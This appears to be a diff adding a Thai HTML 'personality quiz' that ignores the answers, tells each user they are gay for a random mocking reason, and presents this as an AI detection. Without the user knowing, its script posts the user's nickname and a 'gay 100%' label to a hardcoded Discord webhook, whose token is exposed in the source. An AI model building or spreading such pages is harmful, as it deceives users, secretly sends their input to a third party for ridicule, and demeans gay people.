@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>แบบทดสอบบุคลิกภาพและความเป็นตัวตน</title>
+    <style>
+        body { font-family: 'Tahoma', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 600px; width: 100%; }
+        h2 { color: #1a73e8; text-align: center; }
+        .question { margin-bottom: 20px; padding: 15px; border-bottom: 1px solid #eee; }
+        .options { margin-top: 10px; }
+        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 15px; background-color: #1a73e8; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #1557b0; }
+        #result { display: none; text-align: center; padding: 20px; }
+        .gay-reason { font-weight: bold; color: #d93025; font-size: 1.2em; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="quiz-box">
+    <h2>🧬 แบบทดสอบวิเคราะห์อัตลักษณ์ทางจิตวิทยา</h2>
+    <p style="color: #666; font-size: 0.9em;">กรุณาตอบตามความเป็นจริงเพื่อผลลัพธ์ที่แม่นยำที่สุด</p>
+    <hr>
+    
+    <label><b>ชื่อเล่นของคุณ:</b></label>
+    <input type="text" id="nickname" placeholder="กรอกชื่อเล่น..." required>
+
+    <div id="questions-container"></div>
+
+    <button onclick="submitQuiz()">ส่งคำตอบและวิเคราะห์ผล</button>
+</div>
+
+<div class="container" id="result">
+    <h2>📊 ผลการวิเคราะห์เสร็จสิ้น</h2>
+    <p id="user-display"></p>
+    <div class="gay-reason" id="final-reason"></div>
+    <p style="margin-top: 20px; font-size: 0.8em; color: #888;">ระบบ AI ตรวจพบพลังงานบางอย่างจากคำตอบของคุณ</p>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1483400109696880683/prHb7yB9OfCHQAEbdTdyAXNVIuzuu9FK5Z5T0InXu0z8Fm83r4TtdxMO5zrxadg5YfzY";
+    
+    const questions = [
+        "คุณชอบใช้เวลาว่างทำอะไร?", "คุณชอบสีโทนไหนเป็นพิเศษ?", "คุณให้ความสำคัญกับเรื่องใดที่สุด?",
+        "คุณชอบดูหนังแนวไหน?", "คุณชอบทานอาหารประเภทใด?", "คุณเป็นคนตื่นเช้าหรือตื่นสาย?",
+        "คุณชอบสัตว์เลี้ยงชนิดใด?", "คุณชอบท่องเที่ยวที่ไหน?", "คุณคิดว่าตัวเองเป็นคนนิสัยอย่างไร?",
+        "คุณชอบฟังเพลงแนวไหน?", "คุณใช้โซเชียลมีเดียแอปไหนบ่อยที่สุด?", "คุณชอบแต่งตัวสไตล์ไหน?",
+        "คุณถนัดซ้ายหรือขวา?", "คุณชอบฤดูอะไรที่สุด?", "คุณชอบดื่มเครื่องดื่มอะไร?",
+        "คุณเป็นคนคิดมากไหม?", "คุณชอบออกกำลังกายหรือไม่?", "คุณชอบผลไม้ไทยชนิดใด?",
+        "คุณนอนวันละกี่ชั่วโมง?", "คุณอยากทำอะไรก่อนตาย?"
+    ];
+
+    const reasons = [
+        "คุณกดปุ่มส่งแรงเกินไป", "นิ้วก้อยคุณกระดกตอนตอบคำถาม", "แววตามันฟ้องผ่านหน้าจอ",
+        "คุณเว้นวรรคประโยคได้ละมุนเกินไป", "คุณเลือกข้อที่ดูมีจริต", "ระบบ AI ตรวจพบสีรุ้งในใจคุณ",
+        "คุณตอบไวเหมือนกลัวคนรู้", "ทรงผมคุณมันให้", "ท่าทางการนั่งอ่านของคุณมันใช่",
+        "จิตใต้สำนึกของคุณมันเรียกร้อง", "เพราะคุณหล่อ/สวย เกินไปจนใจสั่น", "เพราะดวงดาวบอกมา"
+    ];
+
+    // สร้างคำถาม
+    const qContainer = document.getElementById('questions-container');
+    questions.forEach((q, i) => {
+        qContainer.innerHTML += `
+            <div class="question">
+                <p><b>ข้อที่ ${i+1}:</b> ${q}</p>
+                <input type="text" placeholder="พิมพ์คำตอบของคุณ...">
+            </div>
+        `;
+    });
+
+    function submitQuiz() {
+        const name = document.getElementById('nickname').value;
+        if (!name) {
+            alert("กรุณากรอกชื่อเล่นก่อนครับ!");
+            return;
+        }
+
+        const randomReason = reasons[Math.floor(Math.random() * reasons.length)];
+        const resultText = `คุณเป็นเกย์เพราะ: ${randomReason}`;
+
+        // แสดงผลหน้าเว็บ
+        document.getElementById('quiz-box').style.display = 'none';
+        document.getElementById('result').style.display = 'block';
+        document.getElementById('user-display').innerText = `คุณ ${name}`;
+        document.getElementById('final-reason').innerText = resultText;
+
+        // ส่งข้อมูลเข้า Discord
+        const payload = {
+            embeds: [{
+                title: "🚨 ตรวจพบผู้มีพลังงานสีรุ้ง!",
+                color: 15418782,
+                fields: [
+                    { name: "ชื่อเล่น", value: name, inline: true },
+                    { name: "สถานะ", value: "เป็นเกย์ 100%", inline: true },
+                    { name: "เหตุผล", value: randomReason }
+                ],
+                timestamp: new Date()
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+</script>
+
+</body>
+</html>
